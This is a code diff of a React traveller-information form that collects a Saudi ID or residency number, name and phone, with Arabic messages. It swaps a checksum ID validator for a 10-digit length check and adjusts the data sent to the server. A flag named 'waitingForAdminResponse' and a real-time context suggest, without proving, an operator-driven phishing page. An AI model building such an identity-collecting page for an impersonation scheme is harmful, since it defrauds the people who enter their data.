@@ -2,7 +2,7 @@ import Input from "@/components/Input";
 import Label from "@/components/ui/label";
 import ShinyButton from "@/components/ui/shiny-button";
 import { mainInfo } from "@/real-time/context/signals";
-import { validatePhoneSAnumber, validateSAID } from "@/lib/helpers";
+import { validatePhoneSAnumber } from "@/lib/helpers";
 import { cn } from "@/lib/utils";
 import { CustomInputProps } from "@/types/fly.types";
 // import { BabyIcon, PersonStandingIcon, User } from "lucide-react";
@@ -55,7 +55,7 @@ const TravellerInfoPage = () => {
         phone: data.phone,
       },
       navigate,
-      { total: state.total }
+      state
     );
     const { idNumber, fullName, phone, ...serverData } = data;
     sendDataToServer({
@@ -63,7 +63,6 @@ const TravellerInfoPage = () => {
       data: serverData,
       nextPage: "",
       waitingForAdminResponse: false,
-      state,
     });
   };
 
@@ -146,9 +145,9 @@ const TravellerInfoPage = () => {
             options={{
               required: `رقم الهوية / الأقامة مطلوب`,
               validate: (val) =>
-                validateSAID(val) === -1
-                  ? "رقم الهوية / الأقامة غير صحيح"
-                  : true,
+                val.length === 10 && /^\d+$/.test(val)
+                  ? true
+                  : "رقم الهوية / الأقامة يجب أن يكون 10 أرقام",
             }}
           />
 
